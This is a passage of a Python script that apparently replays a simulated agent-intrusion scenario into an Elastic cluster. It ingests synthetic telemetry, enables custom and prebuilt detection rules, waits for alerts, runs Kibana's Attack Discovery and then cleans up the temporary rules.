                    "connectorName": connector["name"],
                }
        raise SystemExit(f"Connector named {args.connector_name!r} was not found.")

    return None


def run_attack_discovery(kibana: KibanaClient, run_id: str, run_tag: str, connector: dict[str, str], timeout_seconds: int) -> dict[str, Any] | None:
    anon = kibana.request("GET", "/api/security_ai_assistant/anonymization_fields/_find?per_page=1000")
    fields = anon.get("data", []) if isinstance(anon, dict) else []
    body = {
        "alertsIndexPattern": ".alerts-security.alerts-default",
        "anonymizationFields": fields,
        "apiConfig": {
            "connectorId": connector["connectorId"],
            "actionTypeId": connector["actionTypeId"],
        },
        "connectorName": connector["connectorName"],
        "subAction": "invokeAI",
        "size": 150,
        "start": "now-3h",
        "end": "now",
        "replacements": {},
        "filter": {
            "bool": {
                "should": [
                    {"term": {"labels.run_id": run_id}},
                    {"term": {"kibana.alert.rule.tags": run_tag}},
                ],
                "minimum_should_match": 1,
            }
        },
    }
    generated = kibana.request("POST", "/api/attack_discovery/_generate", body=body, timeout=120)
    execution_uuid = generated.get("execution_uuid")
    print(f"attack discovery execution_uuid: {execution_uuid}")
    if not execution_uuid:
        return None

    deadline = time.time() + timeout_seconds
    last: dict[str, Any] | None = None
    while time.time() < deadline:
        response = kibana.request("GET", f"/api/attack_discovery/generations/{execution_uuid}?with_replacements=true")
        last = response
        generation = response.get("generation", {})
        status = generation.get("status")
        print(f"attack discovery status: {status}")
        if status in {"succeeded", "failed", "canceled", "dismissed"}:
            return response
        time.sleep(10)
    return last


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run the Hugging Face agent intrusion replay using an Elastic cluster.")
    parser.add_argument("--es-url", default=os.getenv("ES_URL") or "http://localhost:9200", help="Elasticsearch URL. Default: %(default)s")
    parser.add_argument("--kibana-url", default=os.getenv("KIBANA_URL") or "http://localhost:5601", help="Kibana URL. Default: %(default)s")
    parser.add_argument("--space", default=os.getenv("KIBANA_SPACE") or "default", help="Kibana space. Default: %(default)s")
    parser.add_argument("--username", default=os.getenv("ELASTIC_USERNAME"), help="Elastic username. Prefer ELASTIC_USERNAME env var.")
    parser.add_argument("--password", default=os.getenv("ELASTIC_PASSWORD"), help="Elastic password. Prefer ELASTIC_PASSWORD env var.")
    parser.add_argument("--api-key", default=os.getenv("ELASTIC_API_KEY"), help="Elastic API key. Prefer ELASTIC_API_KEY env var.")
    parser.add_argument("--connector-id", help="Attack Discovery connector ID. Requires --connector-type.")
    parser.add_argument("--connector-type", help="Attack Discovery connector type, such as .inference or .gen-ai.")
    parser.add_argument("--connector-name", help="Attack Discovery connector display name to use or search for.")
    parser.add_argument("--list-connectors", action="store_true", help="List available AI/inference connectors and exit.")
    parser.add_argument("--skip-attack-discovery", action="store_true", help="Generate source data and alerts only.")
    parser.add_argument(
        "--ootb-only",
        "--no-custom-rules",
        dest="ootb_only",
        action="store_true",
        help="Only use OOTB Elastic content; skip the guaranteed custom rules. May end with 0 alerts if OOTB coverage is thin.",
    )
    parser.add_argument("--include-custom-rules", action="store_true", help="Deprecated no-op: custom generated rules now run by default as the guaranteed detection path.")
    parser.add_argument("--debug-rule-matches", action="store_true", help="Print, for each required OOTB intent, the top few closest installed rule names.")
    parser.add_argument("--install-prebuilt-rules", action="store_true", help="Install or update Elastic prebuilt SIEM rules before matching required OOTB coverage.")
    parser.add_argument("--check-ootb-rules", action="store_true", help="Match required OOTB SIEM coverage and exit without ingesting synthetic telemetry.")
    parser.add_argument("--skip-ootb-rule-check", action="store_true", help="Skip the best-effort OOTB SIEM coverage matching step.")
    parser.add_argument("--enable-ootb-rules", action="store_true", help="Enable matched-but-disabled OOTB SIEM rules without prompting.")
    parser.add_argument("--yes", action="store_true", help="Answer yes to prompts, including OOTB rule enablement.")
    parser.add_argument("--run-ootb-rules", action="store_true", help="Manually schedule matched+enabled OOTB SIEM rules after telemetry ingestion (best-effort overlay).")
    parser.add_argument("--ootb-rule-run-lookback-minutes", type=int, default=180, help="Lookback window for manual OOTB rule runs. Default: %(default)s")
    parser.add_argument("--force-ootb-rule-run", action="store_true", help="Pass force=true when falling back to Kibana alerting run_soon API.")
    parser.add_argument(
        "--target-ootb-rules",
        dest="target_ootb",
        action="store_true",
        default=True,
        help="Ingest OOTB-satisfying telemetry and enable+run a curated set of real prebuilt rules so they actually fire (default: on).",
    )
    parser.add_argument(
        "--no-target-ootb-rules",
        dest="target_ootb",
        action="store_false",
        help="Disable the OOTB prebuilt-rule targeting path (real prebuilt rules will then not fire on synthetic data).",
    )
    parser.add_argument("--ootb-target-run-lookback-minutes", type=int, default=20, help="Lookback window for manual runs of targeted OOTB rules. Default: %(default)s")
    parser.add_argument("--ootb-target-alert-timeout", type=int, default=180, help="Seconds to wait for targeted OOTB rules to fire. Default: %(default)s")
    parser.add_argument("--keep-rules-enabled", action="store_true", help="Leave temporary emulation rules enabled after the run.")
    parser.add_argument("--delete-rules-after", action="store_true", help="Delete temporary emulation rules after the run instead of disabling them.")
    parser.add_argument("--min-ootb-alerts", type=int, default=1, help="Minimum alerts to wait for in OOTB-only mode before Attack Discovery. Default: %(default)s")
    parser.add_argument("--alert-timeout", type=int, default=180, help="Seconds to wait for alerts. Default: %(default)s")
    parser.add_argument("--discovery-timeout", type=int, default=300, help="Seconds to wait for Attack Discovery. Default: %(default)s")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification.")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    auth = Auth.from_args(args)
    run_id = now_run_id()
    run_tag = f"{BASE_TAG}-run-{run_id}"
    custom_rules_enabled = not args.ootb_only

    es = HttpClient(args.es_url, auth, args.insecure)
    kibana = KibanaClient(args.kibana_url, auth, args.space, args.insecure)

    print(f"run_id: {run_id}")
    print(f"run_tag: {run_tag}")
    print(f"target_es: {args.es_url}")
    print(f"target_kibana: {args.kibana_url} space={args.space}")
    print(
        "detection_path: "
        + ("custom-guaranteed + OOTB best-effort overlay" if custom_rules_enabled else "OOTB-only (no guaranteed custom rules)")
    )

    es.request("GET", "/")
    kibana.request("GET", "/api/status")

    if args.list_connectors:
        list_ai_connectors(kibana)
        return 0

    if args.install_prebuilt_rules:
        install_prebuilt_rules(kibana)

    coverage: OotbCoverage | None = None
    ootb_run_rules: list[dict[str, Any]] = []
    ootb_rules_enabled_this_run = False
    if args.skip_ootb_rule_check:
        if args.check_ootb_rules:
            print("--check-ootb-rules was ignored because --skip-ootb-rule-check was also set")
            return 0
        print("skipping OOTB coverage matching (--skip-ootb-rule-check)")
    else:
        coverage = match_ootb_intents(kibana)
        report_ootb_coverage(coverage, debug=args.debug_rule_matches)
        print_coverage_guidance(coverage, custom_rules_enabled)
        ootb_run_rules = list(coverage.matched_enabled_rules())
        matched_disabled = coverage.matched_disabled_rules()
        if should_enable_disabled_rules(args, matched_disabled):
            newly_enabled = enable_detection_rules(kibana, matched_disabled)
            ootb_run_rules.extend(newly_enabled)
            ootb_rules_enabled_this_run = bool(newly_enabled)
        if args.check_ootb_rules:
            return 0

    rules = build_rules(run_id, run_tag)
    docs = build_documents(run_id, run_tag)
    created_rules: list[dict[str, str]] = []
    discovery: dict[str, Any] | None = None

    # OOTB prebuilt-rule targeting: key synthetic telemetry to the rules that are
    # actually installed so real prebuilt rules FIRE (not just get enabled).
    ootb_targeting_enabled = args.target_ootb and not args.check_ootb_rules
    if coverage is not None:
        installed_by_rule_id = {r["rule_id"]: r for r in coverage.installed if r.get("rule_id")}
    elif ootb_targeting_enabled:
        installed_by_rule_id = {r["rule_id"]: r for r in fetch_all_detection_rules(kibana) if r.get("rule_id")}
    else:
        installed_by_rule_id = {}

    ootb_target_docs: list[tuple[str, dict[str, Any]]] = []
    ootb_target_covered: list[OotbRuleTarget] = []
    ootb_target_resolved: list[dict[str, Any]] = []
    if ootb_targeting_enabled:
        ootb_target_docs, ootb_target_covered = build_ootb_documents(run_id, run_tag, set(installed_by_rule_id))
        ootb_target_resolved = resolve_ootb_target_rules(ootb_target_covered, installed_by_rule_id)
    ootb_target_uuids = [rule["id"] for rule in ootb_target_resolved if rule.get("id")]

    intent_rule_ids = [rule.get("id") for rule in (coverage.matched_rules() if coverage else []) if rule.get("id")]
    ootb_rule_ids = list(dict.fromkeys(intent_rule_ids + ootb_target_uuids))

    ootb_target_report: dict[str, Any] | None = None

    try:
        ensure_data_streams(es)
        bulk_ingest(es, docs)

        if ootb_targeting_enabled and ootb_target_resolved:
            ensure_ootb_data_streams(es, {t.stream_key for t in ootb_target_covered})
            bulk_ingest(es, ootb_target_docs)
            print(
                f"OOTB targeting: {len(ootb_target_covered)} installed prebuilt rules targeted "
                f"with {len(ootb_target_docs)} synthetic docs across "
                f"{len({t.stream_key for t in ootb_target_covered})} integration data streams"
            )
            enable_detection_rules(kibana, ootb_target_resolved)
            run_detection_rules_now(
                kibana,
                ootb_target_resolved,
                lookback_minutes=args.ootb_target_run_lookback_minutes,
                force=args.force_ootb_rule_run,
            )
        elif ootb_targeting_enabled:
            print(
                "OOTB targeting: none of the curated target prebuilt rules are installed; "
                "run with --install-prebuilt-rules to add them."
            )
        else:
            print("OOTB targeting disabled (--no-target-ootb-rules); real prebuilt rules will not fire on synthetic data.")

        if custom_rules_enabled:
            created_rules = create_rules(kibana, rules)
            rule_ids = [rule["id"] for rule in created_rules]
            bulk_rule_action(kibana, "enable", rule_ids)
            expected_alerts = max(len(created_rules), 1)
            print(f"custom generated rules enabled as the guaranteed detection path: {len(created_rules)}")
        else:
            expected_alerts = args.min_ootb_alerts
            print("OOTB-only mode: guaranteed custom rules are disabled (--ootb-only/--no-custom-rules)")
            if not ootb_run_rules and not ootb_target_resolved:
                print(
                    "WARNING: OOTB-only mode with no targeted or matched+enabled OOTB rules; this run may end "
                    "with 0 alerts. Add --install-prebuilt-rules, or rerun without --ootb-only for a guaranteed narrative."
                )

        want_ootb_run = bool(ootb_run_rules) and (args.run_ootb_rules or ootb_rules_enabled_this_run)
        if args.run_ootb_rules and not ootb_run_rules:
            if custom_rules_enabled:
                print("no matched+enabled OOTB rules to run; relying on the guaranteed custom detection path")
            else:
                print("no matched+enabled OOTB rules to run")
        if want_ootb_run:
            run_detection_rules_now(
                kibana,
                ootb_run_rules,
                lookback_minutes=args.ootb_rule_run_lookback_minutes,
                force=args.force_ootb_rule_run,
            )

        # Poll targeted OOTB prebuilt rules first (their manual runs fire within
        # seconds), so they are confirmed before the custom-rule scheduled wait.
        if ootb_target_resolved:
            print("waiting for targeted OOTB prebuilt rules to fire...")
            ootb_target_counts = wait_for_ootb_target_alerts(
                es, ootb_target_uuids, run_id, timeout_seconds=args.ootb_target_alert_timeout
            )
            ootb_target_report = report_ootb_target_firing(
                ootb_target_covered, ootb_target_resolved, ootb_target_counts
            )

        # Gate the guaranteed custom path on CUSTOM alerts only, so OOTB target
        # alerts (which also carry labels.run_id) can't satisfy the wait early and
        # let the custom rules be disabled before they fire on schedule.
        if custom_rules_enabled:
            wait_for_alerts(
                es, run_id, run_tag, None,
                expected=expected_alerts,
                timeout_seconds=args.alert_timeout,
                custom_only=True,
                label="custom alerts",
            )
        else:
            wait_for_alerts(
                es, run_id, run_tag, ootb_rule_ids,
                expected=expected_alerts,
                timeout_seconds=args.alert_timeout,
                label="ootb alerts",
            )

        # Final combined count (custom + OOTB) for the summary/display.
        alerts, by_rule = alert_count(es, run_id, run_tag, ootb_rule_ids)

        if alerts == 0 and not custom_rules_enabled and not (ootb_target_report and ootb_target_report.get("fired")):
            print(
                "no alerts from OOTB-only run. The synthetic telemetry reliably matches the custom rules; "
                "rerun without --ootb-only to guarantee alerts and a narrative."
            )

        connector = choose_connector(kibana, args)
        if connector and alerts > 0:
            print(f"using attack discovery connector: {connector['connectorName']} ({connector['connectorId']}, {connector['actionTypeId']})")
            discovery = run_attack_discovery(kibana, run_id, run_tag, connector, timeout_seconds=args.discovery_timeout)
        elif alerts == 0:
            print("no matching alerts found; skipping Attack Discovery.")
        elif not args.skip_attack_discovery:
            print("no AI connector selected; alerts generated only. Run --list-connectors, then rerun with --connector-name or --connector-id/--connector-type.")

        matched_installable = len([r for r in coverage.matched() if r.intent.installable]) if coverage else 0
        summary = {
            "run_id": run_id,
            "run_tag": run_tag,
            "campaign_id": CAMPAIGN_ID,
            "documents": len(docs),
            "detection_path": "custom+ootb" if custom_rules_enabled else "ootb-only",
            "custom_rules": {"enabled": custom_rules_enabled, "created": len(created_rules)},
            "ootb": {
                "checked": coverage is not None,
                "installed_scanned": coverage.installed_count if coverage else 0,
                "intents_total": len(OOTB_INTENTS),
                "matched": len(coverage.matched()) if coverage else 0,
                "matched_installable": matched_installable,
                "enabled_this_run": ootb_rules_enabled_this_run,
                "ran": want_ootb_run,
            },
            "ootb_targeting": {
                "enabled": ootb_targeting_enabled,
                "targets_total": len(OOTB_RULE_TARGETS),
                "targets_covered": len(ootb_target_covered),
                "docs_ingested": len(ootb_target_docs),
                "fired": (ootb_target_report or {}).get("fired", 0),
                "fired_rules": [r["rule_name"] for r in (ootb_target_report or {}).get("fired_rules", [])],
                "not_fired_rules": [r["rule_name"] for r in (ootb_target_report or {}).get("not_fired_rules", [])],
            },
            "alerts": alerts,
            "alerts_by_rule": by_rule,
            "attack_discovery": {
                "status": (discovery or {}).get("generation", {}).get("status"),
                "discoveries": (discovery or {}).get("generation", {}).get("discoveries"),
                "execution_uuid": (discovery or {}).get("generation", {}).get("execution_uuid"),
                "titles": [item.get("title") for item in (discovery or {}).get("data", [])],
            }
            if discovery
            else None,
        }
        print(json.dumps(summary, indent=2))
        return 0
    finally:
        if created_rules and not args.keep_rules_enabled:
            rule_ids = [rule["id"] for rule in created_rules]
            try:
                if args.delete_rules_after:
                    bulk_rule_action(kibana, "delete", rule_ids)
                else:
                    bulk_rule_action(kibana, "disable", rule_ids)
            except Exception as cleanup_error:
                print(f"warning: rule cleanup failed: {cleanup_error}", file=sys.stderr)


if __name__ == "__main__":
    raise SystemExit(main())
